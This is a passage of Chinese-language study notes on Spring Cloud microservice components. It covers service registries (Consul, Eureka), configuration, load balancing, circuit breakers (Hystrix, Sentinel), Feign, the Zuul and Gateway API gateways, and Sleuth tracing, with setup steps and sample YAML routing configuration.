<h2 id="Consul（注册中心和配置中心）"><a href="#Consul（注册中心和配置中心）" class="headerlink" title="Consul（注册中心和配置中心）"></a>Consul（注册中心和配置中心）</h2><h3 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h3><p>Consul是HashiCrop公司推出的开源工具，提供了服务注册和发现、分布式一致性协议实现、健康检查、Key&#x2F;Value存储、多数据中心方案等。</p>
<h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>启动Consul服务，可以使用Docker等方法启动Consul。</li>
<li>其它步骤参加Zookeeper的使用方法，不同的是依赖是spring-cloud-consul-discovery</li>
</ol>
<h2 id="Eureka（注册中心）"><a href="#Eureka（注册中心）" class="headerlink" title="Eureka（注册中心）"></a>Eureka（注册中心）</h2><h3 id="功能和组成"><a href="#功能和组成" class="headerlink" title="功能和组成"></a>功能和组成</h3><p>Eureka提供了完整的服务注册和服务发现功能，以及负载均衡、故障转移的功能。</p>
<p>主要包含两个部分：Eureka Client、Eureka Server：</p>
<ul>
<li><p>Eureka Server: 服务注册中心，用于管理各种微服务实例的注册与发现。Eureka Server提供了一种能力，让各个微服务之间彼此连接并互相感知。每当有新的微服务被启动时，它会向Eureka Server节点发送一个REST请求，并且在该服务器上进行注册。同时，对于已经注册的微服务，Eureka Server会接收并存储它们发送的心跳信息，以便为客户端提供最新可用的服务列表。</p>
</li>
<li><p>Eureka Client: （微）服务实例，用于与Eureka Server注册中心进行交互。Eureka Client会向Eureka Server注册自己，并定期发送心跳消息来更新它的状态。同时，它还可以查询Eureka Server上已注册的其他微服务实例的信息，并通过负载均衡算法从可用的微服务列表中选择合适的服务来处理请求。服务提供方和服务消费方都是Eureka Client。</p>
</li>
</ul>
<p>Eureka Server和Eureka Client之间的协作使得微服务可以快速地、灵活地进行部署和扩展，并且可以轻松地进行服务监控和故障排除。</p>
<h3 id="使用方法-3"><a href="#使用方法-3" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>在Eureka Server中，添加pom依赖（spring-cloud-strater-eureka-server），在启动类上添加@EnableEurekaServer注解表示该服务是一个EurekaServer。</li>
<li>在Eureka Client中，添加pom依赖（spring-cloud-strater-eureka），在application.yml中添加配置（配置注册中心的地址defaultZone和自身的名字name），在启动类上添加@EnableEurekaClient注解表示该服务是一个EurekaClient。</li>
</ol>
<h3 id="健康检查"><a href="#健康检查" class="headerlink" title="健康检查"></a>健康检查</h3><p>Eureka通过客户端（Eureka Client）的心跳包来检测客户端状态，但是这种方式只能检测客户端是否在线，不能保证客户端可以对外提供服务，这是因为客户端可能依赖了其它的资源，如数据库、缓存等，如果其依赖的服务无法正常使用，那么即使客户端在线，也不能对外提供服务，这时就需要客户端自己向Eureka Server提供自身的状态。</p>
<p>开启Eureka的健康检查，客户端就能将自身状态就可以传送给Eureka Server了。在application.yml中添加配置即可开启Eureka的健康检查。</p>
<p>Eureka Client有如下状态：UP、DOWN、STARTING、OUT_OF_SERVICE、UNKNOWN</p>
<h3 id="自我保护模式"><a href="#自我保护模式" class="headerlink" title="自我保护模式"></a>自我保护模式</h3><p>自我保护模式是一种应对网络异常的安全保护机制，它的理念是宁可同时保留所有实例（健康的实例和不健康的实例），也不盲目注销任何健康的实例。</p>
<h3 id="就近原则"><a href="#就近原则" class="headerlink" title="就近原则"></a>就近原则</h3><p>Eureka有Region和Zone的概念，Region可以理解为区、Zone可以理解为机房。Eureka Serve启动时需要指定自己所在的Zone。Eureka Client启动时也需要指定Zone，Eureka Client会优先请求自己的Zone下的Eureka Serve列表中的Eureka Serve；如果没有指定，会默认使用defaultZone作为自己的Zone。</p>
<h2 id="Config（配置中心）"><a href="#Config（配置中心）" class="headerlink" title="Config（配置中心）"></a>Config（配置中心）</h2><h3 id="功能、特点和组成"><a href="#功能、特点和组成" class="headerlink" title="功能、特点和组成"></a>功能、特点和组成</h3><p>在研发流程中有测试环境、UAT（User Acceptance Testing，用户验收测试）环境、生产环境等，每个微服务对应多个不同环境的配置文件，修改配置文件十分繁琐。这就需要引入配置中心组件。</p>
<p>Spring Cloud Config提供了分布式配置管理功能。特点如下：</p>
<ol>
<li>服务器存储后端的默认实现使用git。</li>
<li>支持丰富的文件格式，包括yml、json、properities等，还可以自定义文件格式。</li>
<li>配合Spring Cloud Bus可实现配置推送。</li>
<li>Spring Boot项目中不需要改动代码，加入一个启动配置文件指明使用Config Server中哪个配置文件即可。</li>
</ol>
<p>主要包含两个部分：Config Client、Config Server。</p>
<h3 id="使用方法-4"><a href="#使用方法-4" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li>Config的配置必须放在bootstrap.properities中，才能被正确加载，因为放在bootstrap.properities中才能确保config相关的配置先于application.properities加载（bootstrap.properities的加载先于application.properities）。</li>
<li>在Config Server中，添加pom依赖，在启动类上添加@EnableConfigServer注解表示允许该服务以HTTP形式对外提供配置管理服务。</li>
<li>在Config Client中，添加pom依赖，在启动类上添加@EnableAutoConfiguration注解表示自动向Config Server获取项目的配置。</li>
</ol>
<h3 id="热生效"><a href="#热生效" class="headerlink" title="热生效"></a>热生效</h3><p>热生效是指，让修改后的配置动态生效。</p>
<p>用法是在Config Client的启动类上添加@RefreshScope注解。此外，还需要搭配Spring Cloud Bus，通知Config Client进行本地配置更新。</p>
<h3 id="高可用-1"><a href="#高可用-1" class="headerlink" title="高可用"></a>高可用</h3><p>通过将所有Config Server实例以服务提供方的形式注册到Eureka上，Config Client以服务消费方的形式区Eureka获取Config Server的实例。由Eureka提供故障转移、服务注册和发现等功能。</p>
<p>使用方法：</p>
<ol>
<li><p>在Config Server（作为Eureka Client）添加pom依赖，在配置文件application.yml中添加对Eureka注册中心的配置，在启动类上添加注解（具体方法见Eureka的使用方法之Eureka Client的配置方法）。</p>
</li>
<li><p>在Config Client（也是作为Eureka Client）添加pom依赖，在启动类上添加注解（具体方法见Eureka的使用方法之Eureka Client的配置方法）。</p>
<p>不同的是添加配置的位置是bootstrap.yml，在bootstrap.yml中添加对Eureka注册中心的配置，并在原Config Client配置的基础上删除spring.cloud.config.uri的静态的指定，改为将spring.cloud.config.discovery.enabled设为true， 并通过spring.cloud.config.discovery.serviceId指定在注册中心配置的serviceId。</p>
</li>
</ol>
<h1 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h1><h2 id="Ribbon"><a href="#Ribbon" class="headerlink" title="Ribbon"></a>Ribbon</h2><h3 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h3><p>Ribbon最主要的功能是提供了客户端的负载均衡算法，还提供了一系列完整的服务调用配置项，如连接超时、失败重试、访问权重、调用优先级等。</p>
<h3 id="使用方法-5"><a href="#使用方法-5" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li><p>在Eureka的客户端代码的基础上进行改造</p>
<p>将DiscoveryClient改为LoadBalancerClient，并调用其choose方法，会使原先得到的ServiceInstance集合变为得到单个ServiceInstance实例。</p>
</li>
<li><p>使用@LoadBalanced注解</p>
<p>在启动类上（通常，有时也用在配置类上、组件类上等）使用@RibbonClient注解设置需要调用的服务名，在RestTemplate的bean对象上使用@LoadBalanced注解。</p>
<p>如果想要自定义参数和策略，就需要使用自定义配置：</p>
<ol>
<li>使用@RibbonClient注解时，可以设置configuration的值来自定义配置类。</li>
<li>也可以使用配置文件，在配置文件中指定使用的配置类</li>
</ol>
</li>
</ol>
<h1 id="熔断器（断路器）"><a href="#熔断器（断路器）" class="headerlink" title="熔断器（断路器）"></a>熔断器（断路器）</h1><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="限流算法"><a href="#限流算法" class="headerlink" title="限流算法"></a>限流算法</h3><ol>
<li>漏桶算法：漏捅按固定流量流出</li>
<li>令牌桶算法：生成令牌的速度是恒定的，而拿令牌的数量是没有限制的</li>
<li>固定时间窗口法：在一个时间间隔内进行限制，存在临界点缺陷，在时间临界点前后的极短时间内容易遭受攻击</li>
<li>滑动时间窗口算法：可以有效规避固定时间窗口算法中时间临界点的问题</li>
</ol>
<h3 id="隔离方法"><a href="#隔离方法" class="headerlink" title="隔离方法"></a>隔离方法</h3><ol>
<li>线程池隔离：给服务调用设置固定数量的线程，如果被调用服务的正在被使用的线程数达到了限制的数量，就不会再调用，使用存在代价，代价包括线程的上下文切换。</li>
<li>信号量隔离：信号量隔离是使用Semaphore实现的，通过设置的最大信号量控制对资源调用的数量，拿不到信号时直接拒绝。</li>
<li>通过响应时间隔离：当依赖的资源出现响应时间过长的情况，就拒绝对该资源的请求。</li>
<li>QPS（每秒请求次数）隔离：当调用服务的QPS达到阈值时，就拒绝。</li>
</ol>
<h3 id="熔断概念"><a href="#熔断概念" class="headerlink" title="熔断概念"></a>熔断概念</h3><p>当下游服务不可用时，上游服务为了保证自身服务的可用性，不再继续调用目标服务，而是直接返回。</p>
<h3 id="降级概念"><a href="#降级概念" class="headerlink" title="降级概念"></a>降级概念</h3><p>降级是系统将某些不重要的业务或接口的功能停止，以应对高负载的场景。</p>
<h2 id="Hystrix"><a href="#Hystrix" class="headerlink" title="Hystrix"></a>Hystrix</h2><p>微服务架构中一般存在较多的服务单元，这样就出现某个单元因为网络原因等问题出现延迟，如果此时请求方的请求不断增多，时间一长就会形成调用方的任务积压，阻塞请求占用大量的系统的线程、IO等资源，导致调用方的服务瘫痪。进一步的会影响调用方的上游，从而产生“雪崩效应”。</p>
<blockquote>
<p>雪崩效应（Avalanche Effect）是指在分布式系统中，由于某个服务的故障或不可用，从而导致整个系统的连锁反应，最终导致整个系统无法正常工作的现象。</p>
<p>具体来说，当一个服务出现故障时，其它依赖该服务的服务都会请求该服务，并等待响应。如果这些请求全部被堵塞住或响应时间过长，则会消耗掉资源，进而阻塞或延迟其它请求，造成一系列连锁反应。这可能会导致更多的请求堆积，使整个系统变得异常缓慢或直接崩溃。</p>
<p>为了避免雪崩效应，需要考虑以下几种解决方案：</p>
<ol>
<li>限流：限制对服务的访问量和频率，避免过多的请求排队等待。</li>
<li>降级：在一定条件下降低服务的质量和功能，如缩短超时时间、返回默认值等，以保证系统的稳定性。</li>
<li>熔断：在服务发生故障时快速断开与该服务的连接，并通过降级方式替代该服务响应请求，以避免因故障而导致其它服务出现雪崩效应。</li>
</ol>
<p>综上所述，为了保证分布式系统的健壮性和可用性，在设计和实现中需要充分考虑服务之间的依赖和关系，并采取一些必要的措施来避免或应对雪崩问题。</p>
</blockquote>
<p>为解决这一问题，可以使用熔断器（Circuit Breaker）。</p>
<p>熔断器的原理是：当某个服务单元发生故障，通过熔断器的故障监控，向调用方返回一个错误请求，而不是长时间的等待响应，避免故障在分布式系统中蔓延。</p>
<h3 id="熔断原理"><a href="#熔断原理" class="headerlink" title="熔断原理"></a>熔断原理</h3><p>Hystrix提供了熔断模式和隔离模式来缓解雪崩效应。这两种方案都属于阻塞发生之后的应对策略，而非预防性策略（如限流）。</p>
<ol>
<li><p>熔断模式（服务熔断）</p>
<p>如果某个服务响应调用太慢，则熔断对该服务的调用，即后续请求不再调用该服务，直接返回并快速释放资源。</p>
<p>熔断恢复：被熔断的请求不是永久被切断，而是暂停一段时间（默认是5秒）之后允许部分请求通过，若请求都是健康的（ResponseTime&lt;250ms），则取消熔断。</p>
</li>
<li><p>隔离模式（服务降级）</p>
<p>为每个依赖调用分配一个线程池，如果线程池已满，调用将立即被拒绝，加速失败时间。</p>
</li>
</ol>
<p>服务调用的各种结果（成功、异常、超时、拒绝）都会上报给熔断器，加入bucket计算发生的总数。</p>
<h3 id="使用方法-6"><a href="#使用方法-6" class="headerlink" title="使用方法"></a>使用方法</h3><ol>
<li><p>引入Hystrix的maven依赖，spring-cloud-starter-hystrix</p>
</li>
<li><p>在启动类中添加@EnableCircutBreaker注解或@EnableHystrix注解</p>
</li>
<li><p>在controller方法上添加@HystrixCommand，表示开启对该方法的熔断检测功能。</p>
</li>
<li><p>配置方法：</p>
<ol>
<li>直接对@HystrixCommand注解的commandProperities设置@HystirxProperities注解的参数进行配置。</li>
<li>使用配置文件进行配置，Hystrix的大部分配置都以hystrix.command开头</li>
</ol>
<p>可以配置的参数包括：</p>
<ul>
<li>隔离策略的超时时间</li>
<li>最大请求数</li>
<li>进行短路的失败请求的次数阈值</li>
<li>短路后多长时间之后进行重试</li>
<li>出错百分比阈值</li>
<li>……</li>
</ul>
</li>
</ol>
<h3 id="监测工具"><a href="#监测工具" class="headerlink" title="监测工具"></a>监测工具</h3><p>熔断的监测工具有两个：</p>
<ol>
<li>Hystrix Dashboard：针对Hystrix进行实时监控的工具，通过Hystrix Dashboard可以直观的看到各个Hystrix命令的请求响应时间、请求成功率等数据。</li>
<li>Turbine：只使用Hystrix Dashboard只能看到单个应用内的服务信息，而Turbine能够汇总系统内多个服务的数据并显示到Hystrix Dashboard上。</li>
</ol>
<p>Hystrix Dashboard和Turbine监测工具使用方法：</p>
<ol>
<li>在需要被监测的项目中，引入依赖spring-boot-starter-actuator</li>
<li>在仪表盘应用中，引入依赖spring-cloud-starter-hystrix-dashboard，主类中添加@EnableHystrixDashboard注解开启仪表板</li>
<li>在上面创建的仪表盘应用中，继续添加Turbine的依赖spring-cloud-starter-turbine，在配置文件application.yml中添加配置信息，除了要配置Turbine，还需要指定Eureka的地址，使Turbine能够到注册中心查找需要监测的服务实例。</li>
<li>在被监测的服务项目中，也需要进行配置，保证配置中的eureka.instance.metadata-map.cluster和Turbine中的clusterConfig的配置名称一致。</li>
<li>请求Turbine的聚合监测面板地址就能看到聚合后的图形化监测信息。</li>
</ol>
<h2 id="Sentinel"><a href="#Sentinel" class="headerlink" title="Sentinel"></a>Sentinel</h2><h3 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h3><p> <a target="_blank" rel="noopener" href="https://github.com/alibaba/Sentinel">Sentinel</a> 以流量为切入点，从流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性。</p>
<p>Sentinel在服务隔离的实现方式和Hystrix完全不一样，Hystrix使用的是通过线程池隔离，而Sentinel采用了两种不同的手段，信号量隔离、响应时间隔离、QPS隔离。</p>
<p>Sentinel的系统负载保护意思是，Sentinel从系统的维度提供了保护，确保系统的入口流量和系统的负载达到一个平衡，保证系统在能力范围内处理最多的请求。</p>
<h3 id="使用方法-7"><a href="#使用方法-7" class="headerlink" title="使用方法"></a><a target="_blank" rel="noopener" href="https://github.com/alibaba/spring-cloud-alibaba/wiki/Sentinel">使用方法</a></h3><ol>
<li>引入依赖spring-cloud-starter-alibaba-sentinel</li>
<li>添加配置，如Sentinal DashBoard的地址、端口</li>
<li>在Service类要使用Sentinel的方法上使用@SentinelResource注解</li>
</ol>
<h3 id="Sentinel持久化"><a href="#Sentinel持久化" class="headerlink" title="Sentinel持久化"></a><a target="_blank" rel="noopener" href="https://github.com/all4you/sentinel-tutorial/blob/master/sentinel-practice/sentinel-persistence-rules/sentinel-persistence-rules.md">Sentinel持久化</a></h3><p>无论是通过硬编码的方式来更新规则，还是通过接入 Sentinel Dashboard 后，在页面上操作来更新规则，都无法避免一个问题，那就是服务重新后，规则就丢失了，因为默认情况下规则是保存在内存中的。</p>
<p>目前 Sentinel 中默认实现了5种规则持久化的方式，分别是：file、redis、nacos、zk和apollo。</p>
<p>使用方法：</p>
<ol>
<li>引入sentinel持久化依赖</li>
<li>增加配置</li>
<li>实现init()函数</li>
</ol>
<h3 id="Sentinal-DashBoard配置项"><a href="#Sentinal-DashBoard配置项" class="headerlink" title="Sentinal DashBoard配置项"></a>Sentinal DashBoard配置项</h3><h4 id="流控模式"><a href="#流控模式" class="headerlink" title="流控模式"></a>流控模式</h4><ol>
<li>直接：api达到限流条件时，直接限流</li>
<li>关联：当关联的资源达到阈值时，就限流自己</li>
<li>链路：只记录指定链路上的流量（指资源从入口资源进来的流量，如果达到阈值，就进行限流）</li>
</ol>
<h4 id="流控效果"><a href="#流控效果" class="headerlink" title="流控效果"></a>流控效果</h4><ol>
<li>快速失败：直接失败并抛出异常</li>
<li><a target="_blank" rel="noopener" href="https://sentinelguard.io/zh-cn/blog/sentinel-golang-0-6-0-release.html">Warm UP</a>：当系统长期处于低水位的情况下，流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。比如刚启动的服务，数据库连接池可能还未初始化，缓存也处于空的状态，这时候激增的流量非常容易导致服务崩溃。这时我们就可以利用 Sentinel 的 Warm-Up 流控模式，控制通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，而不是在一瞬间全部放行。这样可以给冷系统一个预热的时间，避免冷系统被压垮。</li>
<li>排队等待（<a target="_blank" rel="noopener" href="https://github.com/alibaba/Sentinel/wiki/%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6-%E5%8C%80%E9%80%9F%E6%8E%92%E9%98%9F%E6%A8%A1%E5%BC%8F">匀速排队模式</a>）：这种方式适合用于请求以突刺状来到，这个时候我们不希望一下子把所有的请求都通过，这样可能会把系统压垮；同时我们也期待系统以稳定的速度，逐步处理这些请求，以起到“削峰填谷”的效果，而不是拒绝所有请求。</li>
</ol>
<h4 id="熔断降级"><a href="#熔断降级" class="headerlink" title="熔断降级"></a>熔断降级</h4><p><a target="_blank" rel="noopener" href="https://sentinelguard.io/zh-cn/docs/circuit-breaking.html">Sentinel 提供以下几种熔断策略</a>：</p>
<ul>
<li>慢调用比例 (<code>SLOW_REQUEST_RATIO</code>)：选择以慢调用比例作为阈值，需要设置允许的慢调用 RT（即最大的响应时间），请求的响应时间大于该值则统计为慢调用。当单位统计时长（<code>statIntervalMs</code>）内请求数目大于设置的最小请求数目，并且慢调用的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求响应时间小于设置的慢调用 RT 则结束熔断，若大于设置的慢调用 RT 则会再次被熔断。</li>
<li>异常比例 (<code>ERROR_RATIO</code>)：当单位统计时长（<code>statIntervalMs</code>）内请求数目大于设置的最小请求数目，并且异常的比例大于阈值，则接下来的熔断时长内请求会自动被熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。异常比率的阈值范围是 <code>[0.0, 1.0]</code>，代表 0% - 100%。</li>
<li>异常数 (<code>ERROR_COUNT</code>)：当单位统计时长内的异常数目超过阈值之后会自动进行熔断。经过熔断时长后熔断器会进入探测恢复状态（HALF-OPEN 状态），若接下来的一个请求成功完成（没有错误）则结束熔断，否则会再次被熔断。</li>
</ul>
<h4 id="热点参数限流"><a href="#热点参数限流" class="headerlink" title="热点参数限流"></a>热点参数限流</h4><p><a target="_blank" rel="noopener" href="https://sentinelguard.io/zh-cn/docs/parameter-flow-control.html">热点参数限流</a>会根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。</p>
<p>Sentinel 利用 LRU 策略统计最近最常访问的热点参数，结合令牌桶算法来进行参数级别的流控。</p>
<p>要使用热点参数限流功能，需要引入sentinel-parameter-flow-control，并使用<code>@SentinelResource</code> 注解（与Hysyrix的@HysyrixCommand类似）定义资源</p>
<h1 id="声明式RESTful客户端"><a href="#声明式RESTful客户端" class="headerlink" title="声明式RESTful客户端"></a>声明式RESTful客户端</h1><h2 id="Feign"><a href="#Feign" class="headerlink" title="Feign"></a>Feign</h2><p>使用Ribbon的缺点是需要对请求拼接参数，而<a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-openfeign/reference/html/#spring-cloud-feign">Feign</a>解决了这个问题。使用Feign，可以通过定义接口并添加注解的方式来描述服务间的交互，而无需手动编写HTTP请求代码。</p>
<h3 id="使用方法-8"><a href="#使用方法-8" class="headerlink" title="使用方法"></a><a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-netflix/multi/multi_spring-cloud-feign.html">使用方法</a></h3><ol>
<li><p>添加依赖：spring-cloud-starter-feign</p>
</li>
<li><p>在启动类上添加注解：@EnableFeignClients，该注解的defaultConfiguration属性可以指定所有Feign接口的配置类。</p>
</li>
<li><p>定义Feign接口：使用@FeignClient(name&#x3D;”xxx”)注解定义Feign接口。</p>
<p>该注解除了name属性还有，可以指定用户自定义的配置类的configuration属性，可以在使用了Hystrix的服务中指定熔断的FallBack类的fallback属性。</p>
</li>
</ol>
<h1 id="路由网关"><a href="#路由网关" class="headerlink" title="路由网关"></a>路由网关</h1><p>API 网关是一个搭建在客户端和微服务之间的服务，我们可以在 API 网关中处理一些非业务功能的逻辑，例如权限验证、监控、缓存、请求路由等。</p>
<p>API 网关就像整个微服务系统的门面一样，是系统对外的唯一入口。有了它，客户端会先将请求发送到 API 网关，然后由 API 网关根据请求的标识信息将请求转发到微服务实例。</p>
<h2 id="Zuul"><a href="#Zuul" class="headerlink" title="Zuul"></a>Zuul</h2><h3 id="功能-4"><a href="#功能-4" class="headerlink" title="功能"></a>功能</h3><p>Zuul的具体作用就是服务转发，Zuul可以作为为资源的统一访问入口。</p>
<p>此外Zuul还提供了过滤器的功能，可以用来进行接口权限校验、限流、统计等。</p>
<h3 id="使用方法-9"><a href="#使用方法-9" class="headerlink" title="使用方法"></a>使用方法</h3><p>Zuul用做服务转发的使用方法：</p>
<ol>
<li><p>添加pom依赖，spring-cloud-starter-zuul</p>
</li>
<li><p>在启动类上添加@EnableZuulProxy注解</p>
</li>
<li><p>在application.yml文件中添加配置，zuul.routes的配置格式如下：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-comment">#第一种</span><br>[<span class="hljs-string">serviceId</span>]<span class="hljs-string">:</span>					<span class="hljs-comment">#对应Eureka中的serviceId，规则名与serviceId相同</span><br>	<span class="hljs-attr">path:</span> <span class="hljs-string">/providerURL/**</span>		<span class="hljs-comment">#转发哪些path（URL的path部分，见下文的补充）</span><br><span class="hljs-comment">#第二种</span><br><span class="hljs-attr">customName1:</span>					<span class="hljs-comment">#自定义的转发规则名称</span><br>	<span class="hljs-attr">path:</span> <span class="hljs-string">/fromURL1/**</span>			<span class="hljs-comment">#转发哪些path</span><br>	<span class="hljs-attr">url:</span> <span class="hljs-string">http://localhost:8081</span>	<span class="hljs-comment">#转发到哪个scheme://domain:port</span><br><span class="hljs-attr">customName2:</span>					<br>	<span class="hljs-attr">path:</span> <span class="hljs-string">/fromURL2/**</span>			<br>	<span class="hljs-attr">url:</span> <span class="hljs-string">http://localhost:8082</span>	<br></code></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">zuul:</span><br>  <span class="hljs-attr">host:</span><br>    <span class="hljs-attr">socket-timeout-millis:</span> <span class="hljs-number">60000</span><br>    <span class="hljs-attr">connect-timeout-millis:</span> <span class="hljs-number">60000</span><br>  <span class="hljs-attr">routes:</span><br>    <span class="hljs-attr">frameFronted:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/fronted/frame/**</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">http://localhost:8111</span><br>    <span class="hljs-attr">loginFronted:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/fronted/login/**</span><br>      <span class="hljs-attr">url:</span> <span class="hljs-string">http://localhost:8222</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>其它配置参数：</p>
<ol>
<li>忽略匹配：ingoredPatterns参数可以配置忽略URL</li>
<li>敏感Header过滤：在请求的转发中默认会转发HTTP的Header信息，然而可能有些敏感信息不能被转发给下游系统，如Cookie。可以通过sensitiveHeaders参数进行配置，各项之间使用逗号分隔。</li>
</ol>
<p>匹配顺序：如果想按配置的顺序进行路由规则控制，则需要使用YMAL，如果使用的是properities文件，则会丢失顺序。</p>
<p>补充：</p>
<p>URL结构：</p>
<img src="./Spring-Cloud/image-20230525183105335.png" alt="image-20230525183105335" style="zoom:80%;" />

<h2 id="Gateway"><a href="#Gateway" class="headerlink" title="Gateway"></a>Gateway</h2><h3 id="功能和特点"><a href="#功能和特点" class="headerlink" title="功能和特点"></a>功能和特点</h3><p>Spring Cloud Gateway 是 Spring Cloud 团队基于 Spring 5.0、Spring Boot 2.0 和 Project Reactor 等技术开发的高性能 API 网关组件。</p>
<p>Spring Cloud Gateway 旨在提供一种简单而有效的途径来发送 API，并为它们提供横切关注点，例如：安全性，监控&#x2F;指标和弹性。 </p>
<blockquote>
<p>Spring Cloud Gateway 是基于 WebFlux 框架实现的，而 WebFlux 框架底层则使用了高性能的 Reactor 模式通信框架 Netty。</p>
</blockquote>
<p>Spring Cloud Gateway 具有以下特性：</p>
<ul>
<li>基于 Spring Framework 5、Project Reactor 和 Spring Boot 2.0 构建。</li>
<li>能够在任意请求属性上匹配路由。</li>
<li>predicates（断言） 和 filters（过滤器）是特定于路由的。</li>
<li>集成了 Hystrix 熔断器。</li>
<li>集成了 Spring Cloud DiscoveryClient（服务发现客户端）。</li>
<li>易于编写断言和过滤器。</li>
<li>能够限制请求频率。</li>
<li>能够重写请求路径。</li>
</ul>
<p>可以通过配置使Gateway兼容HTTPS请求，</p>
<p>核心概念（<a target="_blank" rel="noopener" href="https://cloud.spring.io/spring-cloud-gateway/reference/html/#glossary">Glossary</a>）</p>
<p>Spring Cloud GateWay 最主要的功能就是路由转发，而在定义转发规则时主要涉及了以下三个核心概念，如下表。</p>
<table>
<thead>
<tr>
<th>核心概念</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Route（路由）</td>
<td>网关最基本的模块。它由一个 ID、一个目标 URI、一组断言（Predicate）和一组过滤器（Filter）组成。</td>
</tr>
<tr>
<td>Predicate（断言）</td>
<td>路由转发的判断条件，我们可以通过 Predicate 对 HTTP 请求进行匹配，例如请求方式、请求路径、请求头、参数等，如果请求与断言匹配成功，则将请求转发到相应的服务。</td>
</tr>
<tr>
<td>Filter（过滤器）</td>
<td>过滤器，我们可以使用它对请求进行拦截和修改，还可以使用它对上文的响应进行再处理。</td>
</tr>
</tbody></table>
<blockquote>
<p>注意：其中 Route 和 Predicate 必须同时声明（路由断言）。</p>
</blockquote>
<h3 id="断言的类型"><a href="#断言的类型" class="headerlink" title="断言的类型"></a>断言的类型</h3><ol>
<li>After</li>
<li>Before</li>
<li>Between</li>
<li>Cookie</li>
<li>Headers</li>
<li>Host</li>
<li>Method</li>
<li>Path</li>
<li>Query</li>
<li>RemoteAddr</li>
</ol>
<p>多个路由断言可以通过与或非等逻辑连接。</p>
<h3 id="过滤器的类型"><a href="#过滤器的类型" class="headerlink" title="过滤器的类型"></a>过滤器的类型</h3><ol>
<li>AddRequestHeader</li>
<li>AddRequestParameter</li>
<li>AddResponseHeader</li>
<li>Hystrix</li>
<li>PrefixPath</li>
<li>RedictTo</li>
<li>RemoteNonProxyHeaders</li>
<li>RemoveRequestHeader</li>
<li>RemoveResponseHeader</li>
<li>RewritePath</li>
<li>SaveSession</li>
<li>SetPath</li>
<li>SetResponseHeader</li>
<li>SetStatus</li>
<li>StripPrefix</li>
<li>Retry</li>
</ol>
<h3 id="工作流程如下图"><a href="#工作流程如下图" class="headerlink" title="工作流程如下图"></a>工作流程如下图</h3><img src="./Spring-Cloud/image-20230525221748527.png" alt="image-20230525221748527" style="zoom: 80%;" />                                                                                                                                                                                                                                                                                                                       

<h1 id="调用链跟踪"><a href="#调用链跟踪" class="headerlink" title="调用链跟踪"></a>调用链跟踪</h1><h2 id="Sleuth"><a href="#Sleuth" class="headerlink" title="Sleuth"></a>Sleuth</h2><blockquote>
<p>Sleuth</p>
<p> &#x2F; sluːθ</p>
<p>侦查；侦察；警犬</p>
</blockquote>
<h3 id="功能-5"><a href="#功能-5" class="headerlink" title="功能"></a>功能</h3><p>要实现准确快速地定位到线上故障，比较成熟的方案是使用调用链跟踪。调用链跟踪监测系统可以实现如下的功能：</p>
<ol>
<li>快速定位故障</li>
<li>各个调用环节的性能分析</li>
<li>数据分析</li>
</ol>
<p>Spring Cloud Sleuth是Spring Cloud生态中实现调用链跟踪的子项目，Spring Cloud Sleuth可以结合Zipkin，将消息发送到Zipkin，利用Zipkin存储信息，利用Zipkin UI展示数据，也可以只是简单的把数据存储在日记中。</p>
<h3 id="术语（Terminology）"><a href="#术语（Terminology）" class="headerlink" title="术语（Terminology）"></a>术语（<a target="_blank" rel="noopener" href="https://docs.spring.io/spring-cloud-sleuth/docs/3.1.8/reference/htmlsingle/spring-cloud-sleuth.html#getting-started-terminology">Terminology</a>）</h3><p>Spring Cloud Sleuth borrows <a target="_blank" rel="noopener" href="https://research.google.com/pubs/pub36356.html">Dapper’s</a> terminology.</p>
<p><strong>Span</strong>: The basic unit of work. For example, sending an RPC is a new span, as is sending a response to an RPC. Spans also have other data, such as descriptions, timestamped events, key-value annotations (tags), the ID of the span that caused them, and process IDs (normally IP addresses).</p>
<p>Spans can be started and stopped, and they keep track of their timing information. Once you create a span, you must stop it at some point in the future.</p>
<p><strong>Trace:</strong> A set of spans forming a tree-like structure. For example, if you run a distributed big-data store, a trace might be formed by a <code>PUT</code> request.</p>
<p><strong>Annotation&#x2F;Event:</strong> Used to record the existence of an event in time.</p>
<p>Conceptually in a typical RPC scenario we mark these events to highlight what kind of an action took place (it doesn’t mean that physically such an event will be set on a span).</p>
<ul>
